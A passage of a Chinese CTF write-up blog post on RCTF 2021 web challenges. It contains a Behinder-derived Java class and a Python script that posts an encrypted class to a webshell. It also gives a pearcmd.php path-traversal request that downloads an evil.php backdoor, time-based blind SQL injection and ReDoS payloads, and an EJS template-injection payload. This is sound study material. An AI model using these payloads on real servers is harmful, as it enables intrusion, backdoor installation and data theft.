+<p>然后翻一个冰蝎出来，反编译一下，在net.rebeyond.behinder.payload.java下找到basicinfo模块，看看都获取了些啥</p>
+<pre class=" language-java"><code class="language-java">Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Properties props <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>好像也没啥，还有些当前目录，OSinfo啥的，这里肯定没什么用<br>那就自己手写个垃圾class呗，按照他那个类的内容写，把冰蝎和他的代码缝合一下，产生如下的缝合怪</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Iterator<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Set<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">e</span><span class="token punctuation">(</span>Object a<span class="token punctuation">,</span>Object b<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+        HttpServletRequest request <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> a<span class="token punctuation">;</span>
+        HttpServletResponse response <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletResponse<span class="token punctuation">)</span> b<span class="token punctuation">;</span>
+        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Iterator var5 <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        StringBuilder basicInfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"&lt;br/>&lt;font size=2 color=red>环境变量:&lt;/font>&lt;br/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            String name <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            basicInfo<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>env<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        Properties props <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Set<span class="token operator">&lt;</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">>></span> entrySet <span class="token operator">=</span> props<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Iterator var7 <span class="token operator">=</span> entrySet<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">while</span><span class="token punctuation">(</span>var7<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> entry <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token punctuation">)</span>var7<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            basicInfo<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" = "</span> <span class="token operator">+</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>basicInfo<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>然后凭借我垃圾的java水平，虽然能缝合一个加密和文件读取，但是java的文件读取和http请求也太折磨了，不太会用，交给python解决<br>他的加密没写类型，就当最简单的ECB用，init那的mode写的是个数字2，有点抽象，但是看其他代码那填的是加密还是解密，应该不是加密方式。就按这个写<br>网上搜个python AES的加密代码，魔改一下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+<span class="token keyword">import</span> base64
+
+
+url <span class="token operator">=</span> <span class="token string">"http://124.70.137.88:60080/shell"</span>
+key <span class="token operator">=</span> b<span class="token string">"e45e329feb5d925b"</span>
+f <span class="token operator">=</span> open<span class="token punctuation">(</span>r<span class="token string">"D:\Java\projects\untitled1\target\classes\Test.class"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
+class_byte <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+bs <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size
+pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>bs <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> bs<span class="token punctuation">)</span> <span class="token operator">*</span> chr<span class="token punctuation">(</span>bs <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> bs<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
+encrypt_class <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>class_byte<span class="token punctuation">)</span><span class="token punctuation">)</span>
+base64_class <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypt_class<span class="token punctuation">)</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>base64_class<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<p>拿到flag</p>
+<h2 id="VerySafe"><a href="#VerySafe" class="headerlink" title="VerySafe"></a>VerySafe</h2><p>不会。这个题代码都没有，就一个caddy反代一个内网的PHP fpm，内网fpm就一个index.php，且无内容<br>caddy感觉是个类似于nginx的服务器，然后这里写了个规则把所有PHP后缀的访问反代到内网PHP fpm上。那第一反应肯定是打fpm啊。搞不好有什么crlf之类的洞呢，然后又开本地环境调试。发现不同字段之间似乎有奇怪的不可打印字符分割，暂时没找到有什么规律可言。而http header等各项属性均不允许存在不可打印字符，似乎CRLF打不通。搜索历史漏洞，无果，不会</p>
+<p>赛后请教rmb神仙，他和我说是用目录穿越，用PHP自带的一个叫PEAR的依赖，里面有一个pearcmd.php，可以进行任意文件下载</p>
+<p>caddy和nginx有点像，代理服务器和fpm通信时均会发送一个SCRIPT_FILENAME来指定fpm执行哪个文件，并且这个路径是绝对路径，但是nginx会对路径做处理，如果uri开头就是<code>../</code>，则直接返回400，如果是<code>aa/../index.php</code>这种的，也会把跳目录的所有内容先解析掉再发送到后端，所以nginx就不存在这种目录穿越<br>而这里caddy的配置是这个样子的</p>
+<pre class=" language-caddy"><code class="language-caddy">:80 {
+        root * /srv
+        php_fastcgi php:9000
+}
+</code></pre>
+<p>但是他和后端通信的时候，直接是把请求的uri拼在这个root上作为SCRIPT_FILENAME发过去的，就导致能目录穿越到别的地方，去执行其他的脚本</p>
+<p>pearcmd具体没仔细看，是个包管理器，能下载安装包，还能指定路径，并且下载的文件格式不对他也不管，反正就是下下来了。。。</p>
+<p>但是这个文件理论上应该是在命令行上运行的，接受的参数是<code>$argc $argv</code>这种的，但是PHP有一个配置名为register_argc_argv，默认为On，但php.ini中默认为Off，在未指定php.ini时会启动(据说docker大多都未指定php.ini)，且该属性可以通过.user.ini来进行修改<br>这个属性开启后，PHP会注册<code>$argc,$argv</code>这两个变量，并且可以从<code>$_SERVER[&#39;argv&#39;]</code>中获取到该值，并且该值可以通过GET请求提交，但这里变量的分隔符变为了<code>+</code>，而不是常见的<code>&amp;</code></p>
+<p>能任意文件下载的话就下一个后面再目录穿越包含就行了<br><code>/../usr/local/lib/php/pearcmd.php?+install+-R+/tmp+http://ip/evil.php</code><br>evil.php要把后门内容echo出来哦。。。。</p>
+<p>多了一个在PHP功能点只有一个include的情况下，除开upload_progress又一个攻击的手段</p>
+<h2 id="看官方wp环节"><a href="#看官方wp环节" class="headerlink" title="看官方wp环节"></a>看官方wp环节</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">RCTF 2021 Official Writeup</a><br>说到底官方wp看起来详细实际上还是有点抽象啊。。。不自己找点东西根本不能理解</p>
+<p>提一嘴，官方wp里在EasyPHP下提到$uri不会urldecode，是fpm进行的decode，我觉得不对，我之前直接改端口抓的流量显示是nginx自己将$uri这个变量解码了，如果使用的变量是$request_uri是不会解码的</p>
+<h3 id="EasySQLi"><a href="#EasySQLi" class="headerlink" title="EasySQLi"></a>EasySQLi</h3><p>出题人强行引流，wp还引，我直接卧槽嘉畜</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'db.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$order</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT CONCAT('RCTF{',USER(),'}') AS FLAG WHERE '🍬关注嘉然🍬' = '🍬顿顿解馋🍬' OR '🍬Watch Diana a day🍬' = '🍬Keep hunger away🍬' OR '🍬嘉然に注目して🍬' = '🍬食欲をそそる🍬' ORDER BY $order;"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$stm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"Count {$stm->rowCount()}."</span><span class="token punctuation">;</span>
+
+<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token function">floatval</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>一开始我连代码逻辑都看不懂，因为这里又设置了set_time_limit(1);又在最后进行了一个usleep，而usleep的时间稳定大于1s，也就是百分百会延时1s退出<br>但题目提示又是时间盲注，给人整懵了</p>
+<p>后来是看了gml神仙的wp，在set_time_limit中有这样的限制</p>
+<blockquote>
+<p>Note:<br>The set_time_limit() function and the configuration directive max_execution_time only affect the execution time of the script itself. Any time spent on activity that happens outside the execution of the script such as system calls using system(), stream operations, database queries, etc. is not included when determining the maximum time that the script has been running. This is not true on Windows where the measured time is real.</p>
+</blockquote>
+<p>也就是说SQL本身的延时并不在这个计时范围内，但是由于他本身有1s的延时，所以SQL注入的延时也得再来个1s左右以进行判断。<br>并且这里where语句的条件恒为假，选不出来数据，就没法order by，本地测试的时候如果数据只有一条，也不会对其进行order by<br>gml神仙提到pdo默认配置是允许堆叠注入的，不过这里关了，所以还需要找办法</p>
+<p>理论上这个语句已经无敌防御了，因为无论如何order by后面的语句都不会被执行，但这里有一点非常奇怪。首先我们知道order by处是无法进行预处理的，其次是出题人的预处理语法也写的和没写一样，因为他先把参数拼完再进行预处理，而不是像正常使用一样先放个占位符（当然这是看完wp后进行反推的结果嘻嘻）</p>
+<p>然后跟着wp进行测试，发现预处理时会对某些操作进行运算，比如提到的updatexml的报错，如果在这里使得updatexml中的操作耗时极长，就可以造成延时的效果<br>为什么不直接sleep？因为我试了一下预处理的时候不会对sleep进行执行，达咩达咩</p>
+<p><strong>预期解是超级阅读MySQL源码</strong>，对不起我太弱了</p>
+<p>所以这里可以用updatexml配超级repeat来延时，或者套几十层hex，每套一层计算量乘2？</p>
+<pre class=" language-mysql"><code class="language-mysql">SELECT
+    CONCAT( 'RCTF{', USER (), '}' ) AS FLAG 
+WHERE
+    '🍬关注嘉然🍬' = '🍬顿顿解馋🍬' OR '🍬Watch Diana a day🍬' = '🍬Keep hunger away🍬' OR '🍬嘉然に注目して🍬' = '🍬食欲をそそる🍬' 
+ORDER BY
+(
+    updatexml (1,
+        IF(
+            ASCII(SUBSTR((SELECT USER()), 1, 1 )) = 65,
+            CONCAT(REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('b', 10000000)),
+            1
+        ),
+        1
+    ) 
+)
+</code></pre>
+<p>还有出题人的ReDos payload</p>
+<pre class=" language-mysql"><code class="language-mysql">SELECT
+    CONCAT( 'RCTF{', USER (), '}' ) AS FLAG 
+WHERE
+    '🍬关注嘉然🍬' = '🍬顿顿解馋🍬' OR '🍬Watch Diana a day🍬' = '🍬Keep hunger away🍬' OR '🍬嘉然に注目して🍬' = '🍬食欲をそそる🍬' 
+ORDER BY
+(
+    SELECT 1 WHERE
+        IF(
+            ASCII(SUBSTR(USER(), 1, 1 )) = 65,
+            REPEAT('a', 100),
+            'a'
+        )
+        RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' 
+)
+</code></pre>
+<p>gml神仙最后提到这些操作如果携带了<code>from table</code>这样的语句就不会延时了（那么表内字段行不行？待考据），但是我本地用这个语句试了一下还是延时的，不过我本地的MySQL是5.5的远古版本了，可能和新版本不一致，也有可能是我这个payload并不是放在if的判断处？</p>
+<pre class=" language-mysql"><code class="language-mysql"> prepare a from 'select * from users where 0 order by (updatexml(1,if(1,(select id from users where username=concat(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(111111)))))))))))))))))))))))))))))),1),1))';
+</code></pre>
+<p>以及也提到MySQL在8.0.22修了updatexml的延时问题，只有在都是常量的时候比较还有可能延时，其余的都不行了</p>
+<h3 id="xss-it"><a href="#xss-it" class="headerlink" title="xss it?"></a>xss it?</h3><p>好玄幻哦，我一直以为ejs无敌转义来着，知道ejs有原型链污染下的rce，但是没想到没有原型链污染，就纯前端版本的ejs也能打rce</p>
+<p>以及我感觉这个题是个xs-leak，可惜也没做出来<br>官方wp提到三个做法，一个无原型链污染rce，被修了之后可以用Unicode绕过，一个xs-leak打法，以及一个老版本bot的非预期</p>
+<h4 id="解1"><a href="#解1" class="headerlink" title="解1"></a>解1</h4><p>最好理解的无原型链污染、options可控下的rce<br>具体分析过程即为wp中给出的参考链接<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/articles/web/261607.html">Nodejs中模板引擎渲染原理与潜在隐患探讨</a><br>攻击手段即为利用ejs的允许的部分参数，在渲染的时候插入代码，在<code>compileDebug</code>和<code>filename</code>均存在的情况下，可以将用户可控的代码写入渲染模板中的注释<br>使用换行即可逃逸注释符，写入代码，并可以使用finally字段来使得在try catch返回之前执行插入的代码<br>然而此处的ejs版本为3.1.6，文章中的影响版本截止3.1.5，在3.1.6中对传入的filename进行了<code>JSON.stringify()</code>的操作，输入的<code>\u000d\u000a</code>被转义成<code>\r\n</code>（并且是那种转义到\r\n不代表换行仅为对应字符串的程度），需要进行绕过，通过查阅文档，找到新的分隔符<code>\u2028</code>进行换行绕过</p>
+<p>同文章中提到的内容，正常流程下代码无法执行到这一步，可以使用两种方法进行绕过，1是文章中的finally强行在try结束时调用，2是wp中的定义<code>escapeFn</code>函数，js中有提升这一说法，后面定义的函数也能在定义前进行调用</p>
+<p>任意代码执行之后直接发出来就行，这里有一个变量<code>__lines</code>应该就是当前被渲染的属性值？<br><code>asoul=&#123;&quot;jiaran&quot;: &quot;1&quot;, &quot;xiangwan&quot;: &quot;2&quot;, &quot;nailin&quot;: &quot;3&quot;, &quot;jiale&quot;: &quot;4&quot;, &quot;beila&quot;:&quot;5&quot;, &quot;compileDebug&quot;: true, &quot;filename&quot;:&quot;aa\u2028finally&#123;alert(__lines)&#125;//&quot;&#125;</code></p>
+<h4 id="解2"><a href="#解2" class="headerlink" title="解2"></a>解2</h4><p>这个感觉比较预期，打一个xs-leak，上面这个解可能是什么神仙干出来的<br>预期解为修改分隔符，把原来的<code>%</code>替换为进行猜测的数据，通过渲染成功与否进行判断</p>
+<p>输入的模板为<code>&lt;%= jiaran+xiangwan+beila+jiale+nailin %&gt;RCTF&#123;this_is_a_flag_you_should_pay_attension_to_asoul_to_get_it&#125;</code><br>而我们将分隔符由<code>%</code>变为<code>%= jiaran+xiangwan+beila+jiale+nailin %&gt;</code><br>这样子，如果flag匹配上了，原模板会被解析为<code>&lt;自定义分隔符RCTF&#123;this_is_a_flag_you_should_pay_attension_to_asoul_to_get_it&#125;</code><br>而这种情况下，ejs会认为找不到模板标签结束符，从而抛出错误，若自定义分隔符未能与模板匹配，则会认为该模板中没有标签，进行原样输出，正常加载</p>
+<p>终端测试如下</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span>ejs<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"&lt;%= 12345 %>flaggggg"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"delimiter"</span><span class="token punctuation">:</span><span class="token string">"%= 12345 %>"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token operator">&lt;</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">741</span> Uncaught Error<span class="token punctuation">:</span> Could not find matching close tag <span class="token keyword">for</span> <span class="token string">"&lt;%= 12345 %>"</span><span class="token punctuation">.</span>
+    at ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">741</span>
+    at Array<span class="token punctuation">.</span>forEach <span class="token punctuation">(</span><span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">)</span>
+    at Template<span class="token punctuation">.</span>generateSource <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">731</span><span class="token punctuation">)</span>
+    at Template<span class="token punctuation">.</span>compile <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">586</span><span class="token punctuation">)</span>
+    at Object<span class="token punctuation">.</span>compile <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">397</span><span class="token punctuation">)</span>
+    at handleCache <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">234</span><span class="token punctuation">)</span>
+    at Object<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>render <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">424</span><span class="token punctuation">)</span>
+    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span>
+<span class="token operator">></span>ejs<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"&lt;%= 12345 %>flaggggg"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"delimiter"</span><span class="token punctuation">:</span><span class="token string">"%= 12345 %>a"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token operator">&lt;</span><span class="token string">'&lt;%= 12345 %>flaggggg'</span>
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>全是在学nginx语法。。<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://segmentfault.com/a/1190000022499679">Nginx 的基础内置变量 &#x2F; Nginx 重写 url 的模式</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://segmentfault.com/a/1190000022315733">一文理清 nginx 中的 location 配置</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/">PHP FastCGI Example</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://0xgeekcat.github.io/Node-js%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-GYCTF2020-Node-Game.html">Node.js漏洞学习-GYCTF2020 Node Game</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/">register_argc_argv与include限制php任意文件下载的小结</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://igml.top/2021/09/13/2021-RCTF/">gml神仙的wp</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+              <a href="/tags/nginx/" rel="tag"># nginx</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html" rel="prev" title="Fastjson反序列化简易入门">
+      <i class="fa fa-chevron-left"></i> Fastjson反序列化简易入门
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42021%20wp.html" rel="next" title="第五空间2021 wp">
+      第五空间2021 wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RCTF2021-%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">[RCTF2021]挨打记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easyphp"><span class="nav-number">1.1.</span> <span class="nav-text">Easyphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nginx-conf"><span class="nav-number">1.1.1.</span> <span class="nav-text">nginx.conf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flight%E6%A1%86%E6%9E%B6"><span class="nav-number">1.1.2.</span> <span class="nav-text">flight框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.1.3.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.4.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CandyShop"><span class="nav-number">1.2.</span> <span class="nav-text">CandyShop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CheckIn"><span class="nav-number">1.3.</span> <span class="nav-text">CheckIn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezshell"><span class="nav-number">1.4.</span> <span class="nav-text">ezshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VerySafe"><span class="nav-number">1.5.</span> <span class="nav-text">VerySafe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%8B%E5%AE%98%E6%96%B9wp%E7%8E%AF%E8%8A%82"><span class="nav-number">1.6.</span> <span class="nav-text">看官方wp环节</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EasySQLi"><span class="nav-number">1.6.1.</span> <span class="nav-text">EasySQLi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss-it"><span class="nav-number">1.6.2.</span> <span class="nav-text">xss it?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A31"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">解1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A32"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">解2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a 